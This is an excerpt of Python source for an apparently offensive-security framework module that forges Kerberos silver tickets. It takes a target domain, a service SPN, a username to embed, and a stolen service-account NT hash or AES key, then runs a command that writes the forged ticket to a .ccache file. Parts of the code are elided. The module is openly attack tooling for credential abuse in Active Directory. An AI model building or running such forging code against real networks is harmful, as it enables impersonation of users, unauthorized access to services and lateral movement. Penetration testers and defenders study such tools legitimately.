...
class SilverTicket(BaseModule):
    path = "kerberos/silver"
    description = "Forge a Kerberos silver ticket."
    options = {
        ...
        "target_domain": {"default": "", "description": "Target host/domain for SPN placeholder resolution", "required": False},
        "spn": {"default": "cifs/{target_domain}", "description": "Service SPN for silver ticket (supports {target_domain})", "required": False},
        "ticket_user": {"default": "randomuser", "description": "Username to embed in the forged ticket", "required": True},
        "nthash": {"default": "", "description": "Service account NT hash (RC4 key)", "required": False},
        "aes_key": {"default": "", "description": "Service account AES key (128/256-bit)", "required": False},
    ...
    def _resolve_spn(self):
        spn_template = (self.opts.spn or "").strip() or "cifs/{target_domain}"
        resolved_target_domain = (self.opts.target_domain or self.opts.domain).strip()

        if "{target_domain}" in spn_template:
            if not resolved_target_domain:
                self.pane_a.write(
                    "[red][!] `spn` contains `{target_domain}` but neither `target_domain` nor `domain` is set.[/red]"
                )
                return ""
            return spn_template.replace("{target_domain}", resolved_target_domain)
    ...
    async def run(self):
        ...
        command_parts += [self.opts.ticket_user]

        async for line in self.run_command(shlex.join(command_parts), self.pane_b):
            self.pane_b.write(line)

        ticket_path = Path(self.logs_dir) / f"{self.opts.ticket_user}.ccache"
        if ticket_path.exists():
            self.pane_a.write(
                f"[green]✓ Silver ticket saved to `{ticket_path.name}` for SPN `{spn}`[/green]"
            )
        else:
            self.pane_a.write(
